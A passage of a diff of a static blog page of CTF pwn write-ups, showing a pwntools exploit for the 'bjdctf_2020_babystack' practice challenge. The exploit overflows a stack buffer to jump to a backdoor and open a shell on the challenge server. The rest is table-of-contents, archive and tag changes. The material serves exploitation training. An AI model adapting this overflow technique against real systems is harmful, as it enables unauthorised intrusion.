 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./bjdctf_2020_babystack&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26217</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">back_door = <span class="number">0x004006E6</span> </span><br><span class="line">io.sendline(<span class="string">&quot;100&quot;</span>)<span class="comment">#或者这里改为-1</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(back_door)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 
     </article>
     <!-- license -->
@@ -796,7 +769,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-test-your-nc"><span class="toc-number">1.</span> <span class="toc-text">0x1.test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-rip"><span class="toc-number">2.</span> <span class="toc-text">0x2.rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-warmup-csaw-2016"><span class="toc-number">3.</span> <span class="toc-text">0x3.warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-pwn1-sctf-2016"><span class="toc-number">4.</span> <span class="toc-text">0x4.pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x5-ciscn-2019-n-1"><span class="toc-number">5.</span> <span class="toc-text">0x5.ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x6-jarvisoj-level0"><span class="toc-number">6.</span> <span class="toc-text">0x6.jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-ciscn-2019-c-1"><span class="toc-number">7.</span> <span class="toc-text">0x7.ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x8-OGeek2019-babyrop"><span class="toc-number">8.</span> <span class="toc-text">0x8.[OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x9-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">9.</span> <span class="toc-text">0x9.[第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xA-get-started-3dsctf-2016"><span class="toc-number">10.</span> <span class="toc-text">0xA.get_started_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">10.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%AE%B5%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">10.2.</span> <span class="toc-text">方法二：修改内存段的权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xB-ciscn-2019-en-2"><span class="toc-number">11.</span> <span class="toc-text">0xB.ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xC-jarvisoj-level2"><span class="toc-number">12.</span> <span class="toc-text">0xC.jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xD-ciscn-2019-n-8"><span class="toc-number">13.</span> <span class="toc-text">0xD.ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xE-not-the-same-3dsctf-2016"><span class="toc-number">14.</span> <span class="toc-text">0xE.not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xF-bjdctf-2020-babystack"><span class="toc-number">15.</span> <span class="toc-text">0xF.bjdctf_2020_babystack</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#x1.test_your_nc"><span class="toc-number">1.</span> <span class="toc-text">0x1.test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x2.rip"><span class="toc-number">2.</span> <span class="toc-text">0x2.rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x3.warmup_csaw_2016"><span class="toc-number">3.</span> <span class="toc-text">0x3.warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x4.pwn1_sctf_2016"><span class="toc-number">4.</span> <span class="toc-text">0x4.pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x5.ciscn_2019_n_1"><span class="toc-number">5.</span> <span class="toc-text">0x5.ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x6.jarvisoj_level0"><span class="toc-number">6.</span> <span class="toc-text">0x6.jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x7.ciscn_2019_c_1"><span class="toc-number">7.</span> <span class="toc-text">0x7.ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x8.ogeek2019babyrop"><span class="toc-number">8.</span> <span class="toc-text">0x8.[OGeek2019]babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x9.%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9Bpwn5"><span class="toc-number">9.</span> <span class="toc-text">0x9.[第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xa.get_started_3dsctf_2016"><span class="toc-number">10.</span> <span class="toc-text">0xA.get_started_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">10.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E6%AE%B5%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">10.2.</span> <span class="toc-text">方法二：修改内存段的权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xb.ciscn_2019_en_2"><span class="toc-number">11.</span> <span class="toc-text">0xB.ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xc.jarvisoj_level2"><span class="toc-number">12.</span> <span class="toc-text">0xC.jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xd.ciscn_2019_n_8"><span class="toc-number">13.</span> <span class="toc-text">0xD.ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xe.not_the_same_3dsctf_2016"><span class="toc-number">14.</span> <span class="toc-text">0xE.not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xf.bjdctf_2020_babystack"><span class="toc-number">15.</span> <span class="toc-text">0xF.bjdctf_2020_babystack</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
@@ -1130,487 +1103,17 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
         
         
         
@@ -1747,7 +1250,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 64
+        Total : 66
         </div>
         <!-- search  -->
         
@@ -1776,6 +1279,18 @@
             <div class="archive-year"> 2022 </div>
             <ul class="year-list">
             
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/28</span>
+            <a class="archive-post-title" href="/2022/06/28/Latex/">Latex使用笔记</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span>
+            <a class="archive-post-title" href="/2022/05/25/Powershell/">Powershell</a>
+        </li>
+    
         
         <li class="archive-post-item">
             <span class="archive-post-date">05/23</span>
@@ -2208,6 +1723,11 @@
                 Java
             </span>
         
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
+            </span>
+        
             <span class="sidebar-tag-name" data-tags="免杀">
                 <span class="iconfont-archer">&#xe606;</span>
                 免杀
@@ -2243,19 +1763,14 @@
                 Linux
             </span>
         
-            <span class="sidebar-tag-name" data-tags="内网">
+            <span class="sidebar-tag-name" data-tags="OS">
                 <span class="iconfont-archer">&#xe606;</span>
-                内网
+                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="汇编">
                 <span class="iconfont-archer">&#xe606;</span>
                 汇编
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="OS">
-                <span class="iconfont-archer">&#xe606;</span>
-                OS
             </span>
         
             <span class="sidebar-tag-name" data-tags="WriteUp">
@@ -2271,6 +1786,16 @@
             <span class="sidebar-tag-name" data-tags="Win32">
                 <span class="iconfont-archer">&#xe606;</span>
                 Win32
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="ML">
+                <span class="iconfont-archer">&#xe606;</span>
+                ML
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Math">
+                <span class="iconfont-archer">&#xe606;</span>
+                Math
             </span>
         
     </div>
